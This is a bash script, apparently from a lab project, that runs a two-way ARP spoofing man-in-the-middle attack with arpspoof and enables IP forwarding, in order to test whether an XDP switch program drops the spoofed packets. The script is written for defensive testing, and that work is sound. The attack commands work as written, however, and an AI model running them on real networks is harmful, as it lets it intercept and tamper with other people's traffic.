#!/bin/bash
# ═══════════════════════════════════════════════════════════════════════
# attack_arp_spoof.sh — ARP Spoofing Attack Simulation
#
# Run this on the ATTACKER VM to simulate an ARP spoofing attack.
# The XDP program on the switch should detect and drop these packets.
#
# Prerequisites:
#   sudo apt-get install dsniff
#
# Usage:
#   sudo ./attack_arp_spoof.sh <target_ip> <gateway_ip> <interface>
#
# Example:
#   sudo ./attack_arp_spoof.sh 192.168.100.101 192.168.100.1 eth0
# ═══════════════════════════════════════════════════════════════════════

set -euo pipefail

TARGET_IP="${1:-}"
GATEWAY_IP="${2:-}"
IFACE="${3:-eth0}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

if [[ -z "$TARGET_IP" || -z "$GATEWAY_IP" ]]; then
    echo "Usage: $0 <target_ip> <gateway_ip> [interface]"
    echo ""
    echo "Example: $0 192.168.100.101 192.168.100.1 eth0"
    echo ""
    echo "This will attempt to poison the ARP cache of <target_ip>"
    echo "by sending fake ARP replies claiming to be <gateway_ip>."
    echo "The XDP switch should DROP these spoofed packets."
    exit 1
fi

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[ERROR]${NC} Must run as root" && exit 1
fi

# Install arpspoof if not present
if ! command -v arpspoof &>/dev/null; then
    echo -e "${CYAN}[INFO]${NC} Installing dsniff (provides arpspoof)..."
    apt-get update -qq && apt-get install -y -qq dsniff
fi

echo ""
echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║           ARP SPOOFING ATTACK SIMULATION                   ║${NC}"
echo -e "${YELLOW}╠══════════════════════════════════════════════════════════════╣${NC}"
echo -e "${YELLOW}║  Target:    $TARGET_IP${NC}"
echo -e "${YELLOW}║  Gateway:   $GATEWAY_IP${NC}"
echo -e "${YELLOW}║  Interface: $IFACE${NC}"
echo -e "${YELLOW}║                                                            ║${NC}"
echo -e "${YELLOW}║  If XDP is working, these packets will be DROPPED          ║${NC}"
echo -e "${YELLOW}║  at the switch before reaching the target.                 ║${NC}"
echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Enable IP forwarding (required for MITM)
echo 1 > /proc/sys/net/ipv4/ip_forward

echo -e "${RED}[ATTACK]${NC} Starting ARP spoofing..."
echo -e "${RED}[ATTACK]${NC} Sending: '$GATEWAY_IP is at <attacker_mac>' to $TARGET_IP"
echo -e "${CYAN}[INFO]${NC}  Press Ctrl+C to stop"
echo ""

# Run arpspoof in both directions for full MITM
arpspoof -i "$IFACE" -t "$TARGET_IP" "$GATEWAY_IP" 2>&1 &
PID1=$!

arpspoof -i "$IFACE" -t "$GATEWAY_IP" "$TARGET_IP" 2>&1 &
PID2=$!

# Wait for Ctrl+C
trap "kill $PID1 $PID2 2>/dev/null; echo ''; echo -e '${GREEN}[DONE]${NC} Attack stopped.'; exit 0" INT TERM

wait
